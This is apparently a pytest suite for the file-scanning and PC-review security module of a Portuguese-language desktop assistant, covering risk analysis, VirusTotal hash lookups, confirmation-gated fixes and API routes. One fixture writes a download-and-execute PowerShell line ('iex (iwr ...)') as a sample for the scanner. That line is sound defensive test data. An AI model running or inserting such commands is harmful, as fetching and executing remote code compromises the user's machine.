    gravar(seg.casa / "Downloads", "setup.exe", montar_pe(MALICIOSO))
    resultado = app.registro.executar("seguranca_analisar_arquivo", {"caminho": "setup.exe"}, app.contexto("texto"))
    assert resultado["ok"] and resultado["resumo"].startswith("setup.exe:") and resultado["analise"]["risco"] == "alto"
    historico = json.loads((app.cfg.dados / "analises.json").read_text(encoding="utf-8"))
    assert historico[0]["arquivo"] == "setup.exe" and historico[0]["tipo"] == "arquivo"
    tipo, texto, etiquetas, origem = app.memoria.aprendido[-1]
    assert tipo == "conhecimento" and origem == "seguranca"
    assert "setup.exe" in texto and "sem assinatura" in texto and "Risco alto" in texto
    assert {"seguranca", "arquivo:setup.exe", "tipo:pe", "risco:alto", "tecnica:injecao"} <= set(etiquetas)
    assert app.hologramas.aberto("seguranca")
    dados = mod.dados_holograma(app, "seguranca")
    assert dados["atual"]["arquivo"] == "setup.exe" and dados["historico"][0]["titulo"] == "setup.exe"


def test_historico_fica_com_as_ultimas_50(app, seg):
    caminho = gravar(seg.casa / "Downloads", "a.txt", "oi")
    for _ in range(53):
        seg.analisar(caminho)
    assert len(seg.historico()) == 50
    assert len(json.loads((app.cfg.dados / "analises.json").read_text(encoding="utf-8"))) == 50
    novo = Seguranca(app, app.cfg.dados)  # recarrega do disco
    assert len(novo.historico()) == 50


def test_historico_responde_sobre_analises_antigas(app, seg):
    seg.assinatura = lambda _c: dict(ASSINADO)
    seg.analisar(gravar(seg.casa / "Downloads", "InstaladorZoom.exe", montar_pe()))
    r = app.registro.executar("seguranca_historico", {"busca": "zoom"}, app.contexto("texto"))
    assert "InstaladorZoom.exe" in r["resumo"] and "válida" in r["resumo"] and "Fabricante Exemplo" in r["resumo"]
    assert "Não encontrei" in app.registro.executar("seguranca_historico", {"busca": "xyz"}, app.contexto())["resumo"]


def test_memoria_antiga_sem_aprender_nao_quebra(app, seg):
    app.memoria = object()
    seg.analisar(gravar(seg.casa / "Downloads", "b.txt", "oi"))
    assert seg.historico()


def test_resolver_arquivo(seg):
    antigo = gravar(seg.casa / "Downloads", "antigo.zip", b"PK\x05\x06" + b"\0" * 18)
    os.utime(antigo, (time.time() - 100, time.time() - 100))
    novo = gravar(seg.casa / "Downloads", "novo.msi", b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1")
    gravar(seg.casa / "Downloads", "baixando.crdownload", b"x")
    assert seg.resolver_arquivo("último download") == novo
    assert seg.resolver_arquivo("antigo") == antigo  # sem extensão
    sub = gravar(seg.casa / "Documents" / "Projetos", "rodar.ps1", "Write-Host oi")
    assert seg.resolver_arquivo("RODAR.PS1") == sub
    assert seg.resolver_arquivo(str(novo)) == novo
    assert seg.resolver_arquivo("Downloads/novo.msi") == novo
    for texto, erro in (("", "Qual arquivo"), ("nada.exe", "Não encontrei nada.exe"), ("/nao/existe.exe", "Não encontrei")):
        with pytest.raises(arquivo.ErroAnalise, match=erro):
            seg.resolver_arquivo(texto)


def test_programa_aberto_e_janela_ativa_fora_do_windows(seg, monkeypatch):
    import psutil

    class Proc:
        def __init__(self, nome, exe):
            self.info = {"name": nome, "exe": exe}

    monkeypatch.setattr(psutil, "process_iter", lambda *_a, **_k: [Proc("Discord.exe", "C:\\D\\Discord.exe"),
                                                                     Proc("python.exe", "/usr/bin/python")])
    assert seg.programa("discord") == Path("C:\\D\\Discord.exe")
    with pytest.raises(arquivo.ErroAnalise, match="Não encontrei o programa"):
        seg.programa("photoshop")
    with pytest.raises(arquivo.ErroAnalise, match="Só no Windows"):
        seg.programa("janela_ativa")


def test_revisao_fora_do_windows_avisa(app, seg):
    seg.coletor = None
    r = app.registro.executar("seguranca_revisar_pc", {}, app.contexto())
    assert not r["ok"] and r["resumo"] == "A revisão de segurança do PC só funciona no Windows."


def test_revisao_completa_vai_para_historico_e_memoria(app, seg):
    r = app.registro.executar("seguranca_revisar_pc", {"parte": "tudo"}, app.contexto())
    assert r["ok"] and r["resumo"].startswith("Encontrei") and r["itens"]
    assert seg.historico()[0]["tipo"] == "pc"
    assert app.memoria.aprendido[-1][2][:2] == ["seguranca", "revisao_pc"]
    app.registro.executar("seguranca_revisar_pc", {"parte": "conexoes"}, app.contexto())
    assert len(seg.historico()) == 1  # partes avulsas não entram no histórico


def test_corrigir_pede_confirmacao_e_atualiza_o_holograma(app, seg, monkeypatch):
    from sexta.habilidades import windows

    app.registro.executar("seguranca_revisar_pc", {"parte": "tudo"}, app.contexto())
    item = next(i for i in seg.dados_holograma()["atual"]["itens"] if i["id"] == "ini-1")
    args = {k: v for k, v in item["acao"].items()}
    scripts = []
    monkeypatch.setattr(windows, "powershell", lambda s, timeout=0: scripts.append(s) or "ok")
    pedido = app.registro.executar("seguranca_corrigir", args, app.contexto())
    assert pedido.get("pendente") and "desativar Atualizador da inicialização" in pedido["resumo"] and not scripts
    feito = app.registro.confirmar(app.contexto())
    assert feito["ok"] and "não inicia mais" in feito["resumo"] and "StartupApproved\\Run" in scripts[0]
    item = next(i for i in seg.dados_holograma()["atual"]["itens"] if i["id"] == "ini-1")
    assert item["risco"] == "ok" and item["acao"]["acao"] == "reativar_inicializacao"


def test_corrigir_sem_permissao_explica(app, seg, monkeypatch):
    from sexta.habilidades import windows

    def negar(*_a, **_k):
        raise OSError("Requested registry access is not allowed.")

    monkeypatch.setattr(windows, "powershell", negar)
    r = mod.corrigir(app, "desativar_inicializacao", "svc", "HKLM\\SOFTWARE\\X\\Run", "svc.exe", "\\")
    assert not r["ok"] and "administrador" in r["resumo"] and "Gerenciador de Tarefas" in r["resumo"]
    r = mod.corrigir(app, "abrir_seguranca_windows", "", "", "", "")
    assert not r["ok"] and "Windows" in r["resumo"]  # fora do Windows: mensagem clara


def test_correcao_de_abrir_e_livre(app):
    ferramenta = app.registro._ferramentas["seguranca_corrigir"]
    assert ferramenta.nivel_para({"acao": "abrir_windows_update"}) == LIVRE
    assert ferramenta.nivel_para({"acao": "desativar_tarefa"}) == CONFIRMAR


# ---------------------------------------------------------------- VirusTotal (só o hash, com confirmação)

RESPOSTA_VT = {"data": {"attributes": {"last_analysis_stats": {"malicious": 12, "suspicious": 1, "undetected": 55,
                                                               "harmless": 0, "timeout": 2},
                                       "popular_threat_classification": {"suggested_threat_label": "trojan.exemplo"},
                                       "meaningful_name": "setup.exe", "last_analysis_date": 1_760_000_000}}}


def transporte(status: int, corpo: dict | None, pedidos: list):
    def responder(pedido: httpx.Request) -> httpx.Response:
        pedidos.append(pedido)
        return httpx.Response(status, json=corpo or {})
    return httpx.Client(transport=httpx.MockTransport(responder))


def test_interpretar_virustotal():
    vt = interpretar_virustotal(RESPOSTA_VT)
    assert vt["maliciosos"] == 12 and vt["total"] == 68 and vt["rotulo"] == "trojan.exemplo"


def test_virustotal_sem_chave_responde_na_hora(app, seg):
    ferramenta = app.registro._ferramentas["seguranca_virustotal"]
    assert ferramenta.nivel_para({}) == LIVRE
    r = app.registro.executar("seguranca_virustotal", {}, app.contexto())
    assert not r["ok"] and "VIRUSTOTAL_API_KEY" in r["resumo"]


def test_virustotal_manda_so_o_hash_depois_do_sim(app, seg, monkeypatch):
    monkeypatch.setenv("VIRUSTOTAL_API_KEY", "chave-teste")
    pedidos: list[httpx.Request] = []
    seg.http = transporte(200, RESPOSTA_VT, pedidos)
    analise = seg.analisar(gravar(seg.casa / "Downloads", "setup.exe", montar_pe(MALICIOSO)))
    pedido = app.registro.executar("seguranca_virustotal", {}, app.contexto())
    assert pedido.get("pendente") and "só o hash sai do PC" in pedido["resumo"] and not pedidos
    r = app.registro.confirmar(app.contexto())
    assert r["ok"] and "12 de 68" in r["resumo"] and "trojan.exemplo" in r["resumo"]
    assert len(pedidos) == 1 and pedidos[0].url.path.endswith(analise["sha256"])
    assert pedidos[0].headers["x-apikey"] == "chave-teste" and pedidos[0].method == "GET" and not pedidos[0].content
    assert seg.historico()[0]["virustotal"]["maliciosos"] == 12
    assert app.memoria.aprendido[-1][2] == ["seguranca", "virustotal", "arquivo:setup.exe"]


@pytest.mark.parametrize("status, esperado", [(404, "não conhece"), (401, "recusou a chave"), (429, "limite")])
def test_virustotal_respostas(app, seg, monkeypatch, status, esperado):
    monkeypatch.setenv("VIRUSTOTAL_API_KEY", "x")
    seg.http = transporte(status, {}, [])
    ctx = app.contexto()
    ctx.confiavel = True
    r = app.registro.executar("seguranca_virustotal", {"sha256": "a" * 64}, ctx)
    assert esperado in r["resumo"]


def test_virustotal_desligado_em_ajustes(app, seg, monkeypatch):
    monkeypatch.setenv("VIRUSTOTAL_API_KEY", "x")
    app.prefs.atualizar({"seguranca_virustotal": False})
    assert app.registro._ferramentas["seguranca_virustotal"].nivel_para({}) == LIVRE
    assert "desligada em Ajustes" in app.registro.executar("seguranca_virustotal", {}, app.contexto())["resumo"]


# ---------------------------------------------------------------- revisão automática semanal

def test_revisao_semanal(app, seg):
    assert not seg.revisao_automatica_vencida()  # desligada por padrão
    app.prefs.atualizar({"seguranca_revisao_semanal": True})
    assert seg.revisao_automatica_vencida()
    avisos = []
    app.barramento.publicar = lambda tipo, **k: avisos.append((tipo, k))
    r = seg.revisao_automatica()
    assert r["risco"] == "alto" and not app.hologramas.aberto("seguranca")
    assert any(t == "aviso" and "Revisão semanal" in k["texto"] for t, k in avisos)
    assert not seg.revisao_automatica_vencida()
    assert seg.revisao_automatica_vencida(datetime.now() + timedelta(days=8))
    assert json.loads((app.cfg.dados / "seguranca.json").read_text(encoding="utf-8"))["ultima_automatica"]


# ---------------------------------------------------------------- atalhos

def registrar_execucoes(app, monkeypatch) -> list[tuple[str, dict]]:
    chamadas: list[tuple[str, dict]] = []
    monkeypatch.setattr(app.registro, "executar",
                        lambda nome, args, ctx, **_: chamadas.append((nome, args)) or {"ok": True, "resumo": "ok"})
    return chamadas


@pytest.mark.parametrize("frase, ferramenta, args", [
    ("Sexta-feira, analisa o arquivo Setup_v2.exe", "seguranca_analisar_arquivo", {"caminho": "Setup_v2.exe"}),
    ("analisa esse arquivo C:\\Users\\eu\\Downloads\\app.msi", "seguranca_analisar_arquivo",
     {"caminho": "C:\\Users\\eu\\Downloads\\app.msi"}),
    ("analisa o programa Discord", "seguranca_analisar_arquivo", {"programa": "Discord"}),
    ("verifica o instalador zoom.exe", "seguranca_analisar_arquivo", {"caminho": "zoom.exe"}),
    ("o arquivo boleto.pdf é seguro?", "seguranca_analisar_arquivo", {"caminho": "boleto.pdf"}),
    ("o último download é seguro?", "seguranca_analisar_arquivo", {"caminho": "último download"}),
    ("analisa o último download", "seguranca_analisar_arquivo", {"caminho": "último download"}),
    ("esse programa é seguro?", "seguranca_analisar_arquivo", {"programa": "janela_ativa"}),
    ("revisa a segurança do PC", "seguranca_revisar_pc", {"parte": "tudo"}),
    ("faz uma revisão de segurança", "seguranca_revisar_pc", {"parte": "tudo"}),
    ("meu computador está seguro?", "seguranca_revisar_pc", {"parte": "tudo"}),
    ("quem está usando a internet?", "seguranca_revisar_pc", {"parte": "conexoes"}),
    ("quais programas estão usando a internet agora", "seguranca_revisar_pc", {"parte": "conexoes"}),
    ("o que inicia com o Windows?", "seguranca_revisar_pc", {"parte": "inicializacao"}),
    ("quais programas abrem quando o pc liga", "seguranca_revisar_pc", {"parte": "inicializacao"}),
    ("quais portas estão abertas?", "seguranca_revisar_pc", {"parte": "portas"}),
    ("consulta no VirusTotal", "seguranca_virustotal", {}),
    ("abre o painel de segurança", "holograma", {"acao": "mostrar", "tipo": "seguranca"}),
])
def test_atalhos(app, monkeypatch, frase, ferramenta, args):
    chamadas = registrar_execucoes(app, monkeypatch)
    resposta = sem_ia(app).processar(frase)
    assert resposta["caminho"] == "atalho", frase
    assert chamadas[0] == (ferramenta, args)


def test_nome_de_programa_aberto_vira_atalho_e_o_resto_fica_com_a_ia(app, monkeypatch):
    nunca = lambda *_a, **_k: pytest.fail("não devia virar atalho")  # noqa: E731
    monkeypatch.setattr(app.seguranca, "programa", lambda nome: Path("C:/D/Discord.exe") if nome == "discord" else
                        (_ for _ in ()).throw(arquivo.ErroAnalise("não")))
    plano = mod.atalho("o discord e seguro", app.contexto(), lambda n, a: (n, a), "O Discord é seguro?")
    assert plano == ("seguranca_analisar_arquivo", {"programa": "discord"})
    assert mod.atalho("o pix e seguro", app.contexto(), nunca, None) is None
    assert mod.atalho("isso e seguro", app.contexto(), nunca, None) is None


FRASES_DO_NUCLEO = ["abre o spotify", "fecha o chrome", "modo jogo", "analisa a tela", "o que é isso?", "abre o jornal",
                    "volume 30", "que horas são", "abre o tradutor", "abre as configurações", "abre o gerenciador de tarefas",
                    "liga o wifi", "abre a segurança do windows", "como está o clima"]


def test_frases_do_nucleo_nao_sao_capturadas(app):
    def rodar(*_a, **_k):
        raise AssertionError("a extensão capturou uma frase do núcleo")

    assert [f for f in FRASES_DO_NUCLEO if mod.atalho(normalizar(f), app.contexto(), rodar, f) is not None] == []


def test_protocolo_revisao_seguranca(app, seg):
    from sexta.habilidades import rotinas

    rotinas.ACOES_EXTRAS["revisao_seguranca"](app, None, app.contexto(), {})
    assert app.fala.falas[-1].startswith("Encontrei")


# ---------------------------------------------------------------- rotas e diagnóstico

@pytest.fixture
def api(app):
    from sexta.servidor import criar_api

    with TestClient(criar_api(app), base_url="http://127.0.0.1:8765") as c:
        c.headers["Authorization"] = f"Bearer {app.acesso.token_pc}"
        yield c


def test_rotas(app, seg, api):
    assert api.get("/api/seguranca/estado", headers={"Authorization": ""}).status_code == 401
    estado = api.get("/api/seguranca/estado").json()
    assert estado["windows"] is False and estado["virustotal_configurado"] is False and estado["analises"] == 0
    gravar(seg.casa / "Downloads", "x.ps1", "iex (iwr http://exemplo.invalid/a)")
    r = api.post("/api/seguranca/analisar", json={"caminho": "x.ps1"}).json()
    assert r["ok"] and r["texto"].startswith("x.ps1")
    assert api.post("/api/seguranca/analisar", json={}).status_code == 400
    historico = api.get("/api/seguranca/historico").json()["historico"]
    assert historico[0]["titulo"] == "x.ps1"
    completo = api.get(f"/api/seguranca/analise/{historico[0]['id']}").json()
    assert completo["sha256"] and completo["motivos"]
    assert api.get("/api/seguranca/analise/nada").status_code == 404
    assert api.post("/api/seguranca/mostrar", json={"id": historico[0]["id"]}).json() == {"ok": True}
    r = api.post("/api/seguranca/revisar", json={"parte": "portas"}).json()
    assert r["ok"] and "Portas abertas" in r["texto"]
    assert api.post("/api/seguranca/corrigir", json={"acao": "formatar"}).status_code == 400
    r = api.post("/api/seguranca/corrigir", json={"acao": "desativar_tarefa", "nome": "Limpeza", "pasta": "\\"}).json()
    assert r["pendente"] and r["texto"].startswith("Confirma")
    app.registro.cancelar_pendente()


def test_diagnostico(app, monkeypatch):
    monkeypatch.delenv("VIRUSTOTAL_API_KEY", raising=False)
    itens = {i["nome"]: i for i in mod.diagnostico(app)}
    assert itens["PowerShell (segurança)"]["detalhe"] == "só no Windows"
    assert itens["pefile (análise de programas)"]["ok"] == pe.pefile_disponivel()
    assert itens["VirusTotal (opcional)"]["ok"] and "VIRUSTOTAL_API_KEY" in itens["VirusTotal (opcional)"]["dica"]
